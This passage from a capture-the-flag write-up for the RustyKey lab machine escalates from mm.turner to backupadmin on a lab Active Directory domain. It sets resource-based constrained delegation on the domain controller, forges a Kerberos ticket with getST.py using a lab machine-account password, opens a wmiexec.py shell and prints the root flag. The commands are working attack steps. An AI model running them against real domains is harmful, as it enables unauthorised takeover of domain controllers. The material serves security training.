C:\Windows>whoami
whoami
rustykey\mm.turner
```

Now we can see in Bloodhound what we can do with the user mm.turner. We can see that the user can impersonate dc.rustykey.htb. This means that if I follow the steps in Bloodhound below, the user will obtain backupadmin and thus be able to obtain the root file. For the steps below, I used the following two articles, which I used for troubleshooting.
https://www.thehacker.recipes/ad/movement/dacl/
https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd

![[Pasted image 20250704155258.png]]
To exploit this, I looked it up in the second article above, and below you can see the steps you need to take before we can start user impersonating.

![[Pasted image 20250704155945.png]]

First, we will examine the properties of the DC computer.

```
PS C:\Windows> Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount
Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount


DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb
DNSHostName                          : dc.rustykey.htb
Enabled                              : True
Name                                 : DC
ObjectClass                          : computer
ObjectGUID                           : dee94947-219e-4b13-9d41-543a4085431c
PrincipalsAllowedToDelegateToAccount : {}
SamAccountName                       : DC$
SID                                  : S-1-5-21-3316070415-896458127-4139322052-1000
UserPrincipalName                    : 

```

I have set up **resource-based constrained delegation** on the Active Directory computer object DC. This allows the IT-COMPUTER3$ account to pass authentication tokens to this machine on behalf of other users.

```
PS C:\Windows> Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount "IT-COMPUTER3$"
Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount "IT-COMPUTER3$"
```

After setting up the RBCD, I will generate a **Service Ticket (TGS)**, which will allow me to obtain the .ccache file of the user backupadmin. The Domain Controller requests a ticket for the Service Principal Name (**cifs/DC.rustykey.htb**), allowing me to access SMB resources on the Domain Controller with the rights of **backupadmin**. https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd --> (Second Knowledge article from above)

```
getST.py 'RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!' -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip 10.129.35.77
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating backupadmin
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
```

This specifies which ccache file Kerberos should use for authentication.

```
export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
```

To connect to the Windows server as user backupadmin, I started using wmiexec.py (WMI = Windows Management Instrumentation). You can use this to execute commands remotely on a Windows machine.

```
┌──(kali㉿kali)-[~/HTB/RustyKey/RunasCs]
└─$ wmiexec.py -k -no-pass 'RUSTYKEY.HTB/backupadmin@dc.rustykey.htb'
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
rustykey\backupadmin
```

Now that we are the backupadmin user, we can retrieve the root flag. Navigate to the user administrator, then go to the desktop folder, where you will see the root.txt file.

Root flag: 7607f02fc0e4e723139a93f14e27dbf9

```
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 00BA-0DBE

 Directory of C:\Users\Administrator\Desktop

06/24/2025  10:00 AM    <DIR>          .
06/24/2025  10:00 AM    <DIR>          ..
07/04/2025  12:45 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,950,602,752 bytes free

C:\Users\Administrator\Desktop>type root.txt
7607f02fc0e4e723139a93f14e27dbf9
```

![[Pasted image 20250704172232.png]]